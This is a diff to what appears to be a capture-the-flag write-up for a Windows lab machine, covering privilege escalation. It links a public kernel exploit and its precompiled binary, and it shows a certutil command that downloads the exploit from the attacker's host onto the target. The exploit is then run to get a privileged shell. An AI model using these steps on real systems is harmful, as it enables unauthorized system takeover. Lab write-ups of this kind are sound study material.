@@ -126,9 +126,24 @@ Well, that os version has a vulnerability that can assist us in escalatiing our 
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e89a4685-f2bc-4a1b-b559-0cd239244148)
 
-You can get the exploit [here](https://www.exploit-db.com/exploits/41020)
+You can get the exploit [here](https://www.exploit-db.com/exploits/41020). Well, this exploit is in ```.c```, we can just download the ```.exe``` file, since it will be easier to execute on a windows target. You can download the ```.exe``` flle from [here](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe)
+
+The next thing we'll do is send this over to the target's machine
+
+command:```certutil -urlcache -f http://10.10.14.44/41020.exe exploit.exe```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc3b5e8a-95f9-4348-8934-ffb848376b5a)
+
+To execute this file we can run the command ```.\exploit.exe```, this should drop us in a privileged shell
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/655eac48-a120-4c28-ab9f-8a092bc11ced)
+
+We have successfully pwned this box 😎
 
 
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
